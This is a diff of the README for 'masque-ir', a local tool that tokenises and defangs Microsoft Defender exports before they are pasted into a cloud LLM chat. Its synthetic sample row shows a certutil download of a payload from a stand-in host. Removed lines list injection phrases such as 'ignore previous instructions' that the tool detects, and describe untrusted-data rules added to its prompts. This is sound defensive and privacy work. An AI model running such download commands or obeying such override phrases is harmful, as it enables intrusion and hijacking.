@@ -1,108 +1,100 @@
-# *masque-(i)r (pronounced masker)*
+<p align="center"><img src="docs/logo.png" alt="masque-ir logo" width="200"></p>
 
-`masquer` pseudonymises and defangs Microsoft Defender exports on your own
-machine, writes a file you paste into a cloud LLM chat, and fills the answer
-back in with the original values, locally.
+# masque-(i)r
 
-**MASQUER**: Map, Anonymise, Summarise, Quote, Unlink (defang), Export, Restore.
+**Let a cloud LLM triage your Defender data without handing it your customer's
+data.**
 
-Status: early build. See [`PLAN.md`](PLAN.md).
+You have a Microsoft Defender XDR advanced-hunting export and want a second
+opinion from Claude, ChatGPT or Copilot. The export is full of host names,
+users, emails, IPs, SIDs and national IDs that must not leave the machine.
+
+`masquer` replaces every identifier with a token on your machine, writes a
+file you paste into the chat, and puts the real values back into the answer:
+
+```
+Defender export ─► masquer import/outbox ─► paste into chat ─► save answer ─► masquer restore ─► report with real values
+       (local)          tokens, defang          (cloud)                            (local)
+```
+
+- **No API, no network.** You paste a text file into the chat yourself.
+- **Egress gate.** Nothing is written for pasting while any known original, or any new email, IP, ID or similar match, is still in it.
+- **Collapses repeats.** Identical events less than 1 h apart become one row with `FirstSeen`, `LastSeen` and `Count`, so more fits in one paste.
+- **Optional name model.** A small local model (CPU only) finds person names in free text.
+- **Platforms.** Linux, WSL2 and macOS; installs without sudo.
+
+Status: early, usable. MIT licence.
 
 ## Install
 
-Linux, WSL2 or macOS, as your normal user (no sudo). Download, check it's not
-empty, then run: the script checks the prerequisites, installs `uv` (pinned
-version from GitHub, SHA256 checked) if it's missing, then installs `masquer`
-into `~/.local/bin`.
-
 ```bash
-T=$(mktemp) && curl -fsSL https://raw.githubusercontent.com/kaywoz/masque-ir/main/install.sh -o "$T" && [ -s "$T" ] && bash "$T"; rm -f "$T"
+# Linux, WSL2 or macOS, as your normal user
+T=$(mktemp) && curl -fsSL https://raw.githubusercontent.com/kaywoz/masque-ir/main/install.sh -o "$T" && [ -s "$T" ] && bash "$T" --with-ner; rm -f "$T"
 ```
 
-Only check, change nothing: add `--check`. Other modes: `--dry-run`,
-`--verify`, `--ref TAG`. Any `FAIL` stops the install.
+To check the prerequisites without changing anything, add `--check`. Offline
+machines and proxies with TLS inspection: [docs/usage.md](docs/usage.md#install).
 
-Needs github.com and codeload.github.com. If
-release-assets.githubusercontent.com is blocked or TLS-inspected, `uv` comes
-from its PyPI wheel instead (same pinned version, SHA256 checked); a Python
-3.11+ must then already be installed. PyPI (pypi.org, files.pythonhosted.org) is only needed to
-build from source: when it's blocked, the installer uses the release's
-prebuilt wheel instead (checked against the release's `SHA256SUMS`). The wheel
-is pure Python, so the same file installs on Linux, WSL2 and macOS.
-
-Fully offline (no GitHub, no PyPI): copy `uv` into `~/.local/bin` and a
-release wheel onto the machine, then:
+## Run
 
 ```bash
-bash install.sh --wheel masquer-VERSION-py3-none-any.whl
-```
-
-Models (later) also need huggingface.co, or `--models-from DIR`.
-
-## Use
-
-```bash
-# local machine (shell); CASE is a folder name you choose
-masquer case new CASE
-masquer import CASE DeviceProcessEvents.csv DeviceNetworkEvents.csv
-masquer outbox CASE --allow-without-ner        # writes CASE/outbox-1.md
+masquer case new CASE                                   # folder, mode 700
+masquer import CASE DeviceProcessEvents.csv EmailEvents.csv
+masquer outbox CASE                                     # writes CASE/outbox-1.md
 # paste outbox-1.md into the chat, save the answer as CASE/inbox-1.md
-masquer restore CASE CASE/inbox-1.md           # writes CASE/report-1.md
+masquer restore CASE CASE/inbox-1.md                    # writes CASE/report-1.md
 ```
 
-- **import**: identity columns become tokens (`«HOST_0001»`, `«UPN_0003»`,
-  `«IP_PUB_0002»`), free text is scanned (emails, IPs, URLs, SIDs, GUIDs,
-  national IDs with checksums, IBANs, phone numbers, MACs, user paths, UNC
-  hosts, domains), then swept for every value already known; URLs are
-  defanged, long blobs replaced by their hash; exact repeats less than 1 h
-  apart are collapsed (`FirstSeen`, `LastSeen`, `Count`); per-event fields
-  (`ReportId`, process id and creation time, `NetworkMessageId`, `LocalPort`)
-  are ignored for that, and the collapsed row keeps the first event's values.
-- **outbox**: built-in prompt or `--prompt FILE`; split into parts above
-  `--max-chars`. The **egress gate** runs first and blocks the outbox if any
-  known original or any new detector hit is left.
-- **Injection**: rows with instruction-like text ("ignore previous
-  instructions", "reveal the original values", `</data>`, `system:` …) are
-  counted and noted in the outbox header. `--neutralise-injection` replaces
-  them with `«INJECTION_n»` tokens (restored in the report), for assistants that
-  refuse such input (seen with Defender Copilot).
-- **Answer format**: every prompt (built-in or `--prompt FILE`) gets the same
-  rules appended: keep tokens, treat data as untrusted, and answer in **one**
-  ```` ```markdown ```` block (inner code as `~~~kql`), so one copy button takes
-  the whole answer. `restore` removes that outer fence again.
-- **restore**: tokens back to originals; tokens the model altered are restored
-  and marked `⚠(was …)`, unknown tokens marked `⚠ unknown token`.
-- Deny-lists (always tokenised) and allow-lists (provably not the customer's):
-  `~/.config/masquer/deny.txt`, `allow.txt`, and `deny.txt`/`allow.txt` in the
-  case folder. One value per line.
-- **Name detection** (optional, `install.sh --with-ner`): a local GLiNER model
-  (`knowledgator/gliner-pii-edge-v1.0`, Apache-2.0, 185 MB, pinned by revision
-  and SHA256) finds person names in free text, file names and subjects during
-  `import`. It only adds tokens; the egress gate still decides. CPU only (torch
-  from the CPU index on Linux, ~1 GB installed). Offline machines:
-  `install.sh --with-ner --models-from DIR` with the five model files copied
-  from another machine. Without the model, `outbox` refuses to run unless
-  `--allow-without-ner` is given (check the outbox by hand then).
-
-## Synthetic test data
-
-`masquer synth` writes fake Defender advanced-hunting exports: all 66 tables
-from the Microsoft Learn schema, every column, as CSV (UTF-8 or UTF-16 with
-BOM, CRLF, like a portal export) or JSON. Values are fake and use reserved
-ranges (`.example` domains, documentation IPs, fiction phone numbers);
-national IDs, IBANs and organisation numbers carry valid checksums so the
-detectors can be tested. Every planted sensitive value is listed in
-`canaries.json` for leak tests. A small consistent world sits behind the
-rows: devices, users and binaries keep their names, IDs, SIDs, signers,
-paths and sizes across rows and tables; process trees are in time order; one
-phishing-to-exfiltration storyline is mixed into benign activity. Repeats of
-the same activity differ only in the per-event fields Defender sets
-(Timestamp, ReportId, process id and creation time, NetworkMessageId), to test
-collapsing. `--no-injection` leaves out the planted prompt-injection strings.
-
-```bash
-# any host with uv (shell), from a checkout
-uv run masquer synth --out ./synth --rows 200
-uv run masquer synth --list
+```text
+DeviceProcessEvents: 60 rows -> 48 after collapsing
+EmailEvents: 60 rows -> 49 after collapsing
+CASE/outbox-1.md  (77491 bytes)
+Egress gate: passed. Paste the file(s) into the chat; save the answer as inbox-N.md in the case.
+CASE/report-1.md: restored 4
 ```
 
+To try it without real data: `masquer synth --out synth` writes fake exports
+for all 66 Defender tables.
+
+## What the data looks like
+
+The values below come from `masquer synth`: synthetic, `.example` and `.test`
+domains.
+
+**Export** (3 of 69 columns):
+
+| DeviceName | AccountUpn | ProcessCommandLine |
+|---|---|---|
+| fja-lt-0007.corp.fjallbacka-se.example | erik.johansson@fjallbacka-se.example | `certutil.exe -urlcache -f http://cdn-0114.test/dl/4cb73a80a3b4.php C:\Users\erik.johansson\AppData\Local\Temp\a.exe` |
+
+**Outbox** (what the chat sees):
+
+| DeviceName | AccountUpn | ProcessCommandLine |
+|---|---|---|
+| «HOST_0004» | «UPN_0003» | `certutil.exe -urlcache -f hxxp://«DOMAIN_0004»/dl/4cb73a80a3b4.php C:\Users\«ACCOUNT_0003»\AppData\Local\Temp\a.exe` |
+
+Hashes, Microsoft binaries, paths and timestamps stay as they are, so the
+model can still reason about them. Long encoded blobs become
+`«BLOB sha256=… len=…»`.
+
+**Answer → report:**
+
+```text
+answer:  Isolate «HOST_0004»; reset «UPN_0003». Block «DOMAIN_0004» (seen in hxxp://«DOMAIN_0004»/dl/4cb73a80a3b4.php).
+report:  Isolate fja-lt-0007.corp.fjallbacka-se.example; reset erik.johansson@fjallbacka-se.example. Block cdn-0114.test (seen in hxxp://cdn-0114.test/dl/4cb73a80a3b4.php).
+```
+
+Tokens the model changed are restored and marked `⚠(was …)`. Tokens it made up
+are marked `⚠ unknown token`.
+
+## Limits
+
+- The input is Defender advanced-hunting CSV or JSON exports. Other sources aren't supported yet.
+- The tokens hide identities, not the story. The chat still sees what happened, when, and with which tools.
+- Without the name model (`--with-ner`), names inside free text such as file names and subjects can slip through. `outbox` then refuses to run until you pass `--allow-without-ner` and check the file by hand.
+
+## More
+
+- [docs/usage.md](docs/usage.md): install options, all commands and flags, deny/allow lists, the name model, prompts.
+- [docs/how-it-works.md](docs/how-it-works.md): detectors, egress gate, collapsing, restore, synthetic data.
+- [PLAN.md](PLAN.md): design decisions and parked ideas.
